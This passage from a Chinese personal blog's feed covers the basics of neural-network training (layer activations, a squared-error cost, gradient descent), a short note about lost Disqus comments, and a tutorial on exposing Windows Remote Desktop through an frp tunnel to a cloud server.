style="top:-2.3986920000000005em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">L</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4374159999999999em;"><span></span></span></span></span></span></span></span></span></span>.<br />第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>层拥有的神经节数为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>N</mi><mi>L</mi></msub></mrow><annotation encoding="application/x-tex">N_L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">L</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br />设处理函数为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span></span></span></span>，所以可以得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>a</mi><mi>i</mi><mrow><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo></mrow></msubsup><mo>=</mo><mi>σ</mi><mrow><mo fence="true">(</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>N</mi><mrow><mi>L</mi><mo>−</mo><mn>1</mn></mrow></msub></munderover><msubsup><mi>W</mi><mrow><mi>i</mi><mo>−</mo><mi>j</mi></mrow><mrow><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo></mrow></msubsup><mo>⋅</mo><msubsup><mi>a</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>L</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msubsup><mo fence="true">)</mo></mrow><mo>+</mo><msubsup><mi>B</mi><mi>i</mi><mrow><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">a_i^{(L)}=\sigma\left(\sum_{j=1}^{N_{L-1}}W_{i-j}^{(L)}\cdot a_j^{(L-1)}\right)+B_i^{(L)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.321664em;vertical-align:-0.276864em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">L</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2950830000000004em;vertical-align:-1.4137769999999998em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8813060000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.352975em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.356707142857143em;margin-left:-0.10903em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">L</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.20281428571428572em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231360000000004em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">L</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.412972em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">L</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.412972em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.321664em;vertical-align:-0.276864em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231360000000004em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">L</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span></span></span></span></span></p><h3 id="神经网络的输入与输出"><a class="markdownIt-Anchor" href="#神经网络的输入与输出"></a> 神经网络的输入与输出</h3><p>除了第一层的输入层和最后一层的输出层，中间的那些隐藏的层就是如上面这样接受处理。但是输入层和输出层就不一样了。</p><p>接下来，都以一个最基本的 AI 项目为例：识别手写数字。</p><h4 id="输入层"><a class="markdownIt-Anchor" href="#输入层"></a> 输入层</h4><p>那么输入首先应该是一张图片，那么每一个像素都应该作为输入层的一个神经元，向下一层输出这个像素的值（比如黑：1，白：0）</p><h4 id="输出层"><a class="markdownIt-Anchor" href="#输出层"></a> 输出层</h4><p>输出层应该有 10 个神经元代表 0-9 的十个数字，如果说输出值限制在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>之间的话，那么每个神经元的输出值就代表了所识别的图片是这个神经元代表的数字的概率。</p><p>那么概率最大的就是这整个神经网络的识别结果。</p><h2 id="神经网络的训练"><a class="markdownIt-Anchor" href="#神经网络的训练"></a> 神经网络的训练</h2><p>但是可以看出直接让神经网络不经训练去识别数字，完全就是等于乱猜。<br />那么究竟什么是训练（学习）呢？</p><p>由于要构建神经网络，除了输入层和输出层的神经元个数是和外部条件有关的，中间可以添加若干层神经元，每一层又可以有若干个神经元。所以每个神经元都会有一个偏置<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>.</p><p>那么相邻层的每个神经元之间就会产生许多的神经连结。每个神经连结都会带上一个权重<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span></span></span></span>.</p><p>所以就会有很多的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span></span></span></span>。那么对于两个参数组的不断调节，然后就使得神经网络能够做到一些智能目标，就是训练要做的。</p><pre><code>外话：但是，为什么这样就可以产生智能呢？不知道，因为这就是在不知原因的情况下模仿生物神经。除非到知道人类大脑怎么产生智能的时候。</code></pre><h3 id="目标代价"><a class="markdownIt-Anchor" href="#目标代价"></a> 目标代价</h3><p>在训练之前，先要知道刚建立的神经网络的识别结果<del>（有多智障）</del>与我们的预期差了多少。<br />对于输出层的 10 个神经元，每个都会产生一个概率值(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>)，但是期望自然是正确的那个数字的输出是 1，其余都是 0.<br />在这里设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>的期望值为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(arget),目标代价为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>(ost).<br />所以对于识别手写来说：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mn>9</mn></munderover><mo stretchy="false">(</mo><msub><mi>t</mi><mi>i</mi></msub><mo>−</mo><msubsup><mi>a</mi><mi>i</mi><mrow><mo stretchy="false">(</mo><mi>l</mi><mi>a</mi><mi>s</mi><mi>t</mi><mo stretchy="false">)</mo></mrow></msubsup><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">C=\sum_{i=0}^9 (t_i-a_i^{(last)})^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0787820000000004em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000004em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.321664em;vertical-align:-0.276864em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight">s</span><span class="mord mathdefault mtight">t</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="梯度计算与梯度下降"><a class="markdownIt-Anchor" href="#梯度计算与梯度下降"></a> 梯度计算与梯度下降</h3><p>但是光知道目标代价并没用，还需要知道手头上的参数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>会对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>产生多少影响，然后怎么反过来调节<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>.</p><p>想知道一个量对一个量的影响程度有多少，那么就应该让<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>分别对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>进行求导。然后根据导数进行调整，最终目的就是要让<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>变小。</p><p>(To be continued)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;这篇博文也算不上什么入门教程，单纯只是记录一下看了&lt;a href=&quot;http://www.3blue1brown.com/&quot; target=&quot;_
      
    
    </summary>
    
    
      <category term="技术" scheme="https://blog.rainbowyang.moe/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://blog.rainbowyang.moe/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="神经网络" scheme="https://blog.rainbowyang.moe/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    
      <category term="深度学习" scheme="https://blog.rainbowyang.moe/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>然而评论真的飞了</title>
    <link href="https://blog.rainbowyang.moe/post/Blog/Comments-Got-Lost.html"/>
    <id>https://blog.rainbowyang.moe/post/Blog/Comments-Got-Lost.html</id>
    <published>2018-08-09T10:11:14.000Z</published>
    <updated>2020-07-16T03:06:29.723Z</updated>
    
    <content type="html"><![CDATA[<p>由于在使用Disqus的时候，其中的标识符shortname写错了，然后所有的评论被认为是另一个网站的了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;由于在使用Disqus的时候，其中的标识符shortname写错了，然后所有的评论被认为是另一个网站的了。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="Blog" scheme="https://blog.rainbowyang.moe/categories/Blog/"/>
    
    
      <category term="博客" scheme="https://blog.rainbowyang.moe/tags/%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="评论" scheme="https://blog.rainbowyang.moe/tags/%E8%AF%84%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>实现远程桌面（系统重装第二弹）</title>
    <link href="https://blog.rainbowyang.moe/post/Reinstall-Remote-Desktop.html"/>
    <id>https://blog.rainbowyang.moe/post/Reinstall-Remote-Desktop.html</id>
    <published>2018-08-09T08:18:22.000Z</published>
    <updated>2019-07-02T07:51:33.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>第一次发博这么积极欸。<br />虽然说是重安，但由于之前安的时候也是不假思索的依葫芦画瓢。所以第二次安，也是不太顺利，有一些地方也完全忘了。那也就记录一下。</p><h2 id="简述"><a class="markdownIt-Anchor" href="#简述"></a> 简述</h2><p>首先说下我远程桌面的配置环境是本地（Windows10），然后绑定ip到云服务器（Ubuntu）。然后用的主要就是<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>，然后进一步提升使用体验，还要用到<a href="http://nssm.cc/download" target="_blank" rel="noopener">NSSM</a>和Nohup。</p><h2 id="level1"><a class="markdownIt-Anchor" href="#level1"></a> Level1</h2><h3 id="windows上"><a class="markdownIt-Anchor" href="#windows上"></a> Windows上</h3><ol><li><p>在&quot;设置&quot;里打开&quot;远程桌面&quot;，打开&quot;启用远程桌面&quot;。</p></li><li><p>下载frp：<a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases</a><br />可以把Windows和Linux的都先下载，然后配置好了，再把Linux的传过去。</p><ul><li>Windows x64: <a href="https://github.com/fatedier/frp/releases/download/v0.20.0/frp_0.20.0_windows_amd64.zip" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/download/v0.20.0/frp_0.20.0_windows_amd64.zip</a></li><li>Windows x32: <a href="https://github.com/fatedier/frp/releases/download/v0.20.0/frp_0.20.0_windows_386.zip" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/download/v0.20.0/frp_0.20.0_windows_386.zip</a></li><li>Linux amd64(不知道选什么的话 可以先试试这个): <a href="https://github.com/fatedier/frp/releases/download/v0.20.0/frp_0.20.0_linux_amd64.tar.gz" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/download/v0.20.0/frp_0.20.0_linux_amd64.tar.gz</a></li></ul></li><li><p>配置frp文件<br />下好打开之后，里面有7个文件，如下：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frpc(.exe)      &#x2F;&#x2F;客户端主程序 [c]lient </span><br><span class="line">frpc.ini        &#x2F;&#x2F;客户端配置文件</span><br><span class="line">frpc_full.ini   </span><br><span class="line">frps(.exe)      &#x2F;&#x2F;服务端主程序 [s]erver</span><br><span class="line">frps.ini        &#x2F;&#x2F;服务端配置文件</span><br><span class="line">frps_full.ini   </span><br><span class="line">LICENSE</span><br></pre></td></tr></table></figure><p>Windows这里作为客户端，需要frpc.exe和frpc.ini<br />Linux作为服务端，需要frps和frps.ini</p><p>Windows的frpc.ini配置内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; [这里改成云服务器ip]</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[remote-desktop]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 3389</span><br></pre></td></tr></table></figure><p>Linux的frps.ini配置内容(这个默认就是这样)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure><h3 id="linux上"><a class="markdownIt-Anchor" href="#linux上"></a> Linux上</h3><ol><li>把刚才的frps和frps.ini复制到一个文件夹里。</li><li>运行</li></ol><figure class="highlight plain"><figcaption><span>-c ./frps.ini```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后回到Windows运行&#96;&#96;&#96;.&#x2F;frpc.exe -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><h3 id="手机登录"><a class="markdownIt-Anchor" href="#手机登录"></a> 手机登录</h3><ol><li>安装<a href="https://play.google.com/store/apps/details?id=com.microsoft.rdc.android&amp;hl=zh" target="_blank" rel="noopener">Microsoft Remote Desktop</a></li><li>然后右上角“+”，添加Desktop，第一个就是 [云服务器ip]:3389 ,第二个就是Windows的账户</li><li>然后就可以了。</li></ol><h2 id="level-up"><a class="markdownIt-Anchor" href="#level-up"></a> Level Up</h2><h3 id="windows-开机启动frp服务"><a class="markdownIt-Anchor" href="#windows-开机启动frp服务"></a> Windows 开机启动frp服务</h3><ol><li>建个bat放在frpc.exe的同个目录下，可以叫run.bat<br />里面写上<code>frpc.exe -c ./frpc.ini</code></li><li>下载NSSM <a href="http://nssm.cc/release/nssm-2.24.zip" target="_blank" rel="noopener">http://nssm.cc/release/nssm-2.24.zip</a><br />nssm.exe并不能直接用。<br />先打开命令行运行<code>nssm.exe install frp</code>。<br />然后在弹出的界面里，第一个选上之前的bat文件</li><li>打开&quot;计算机管理-服务和应用程序-服务&quot;，找到frp，启动。</li></ol><h3 id="linux后台运行"><a class="markdownIt-Anchor" href="#linux后台运行"></a> Linux后台运行</h3><ol><li><code>nohup ./frps -c ./frps.ini &amp;</code></li><li>如果没有nohup的话（不知道有没有这个可能）<br />就先运行<code>apt-get install nohup</code>，再运行第一步。</li></ol><h3 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h3><p>你可以试下重启电脑，然后试试效果</p>]]></content>
    
    <summary type="html">
    
      
      
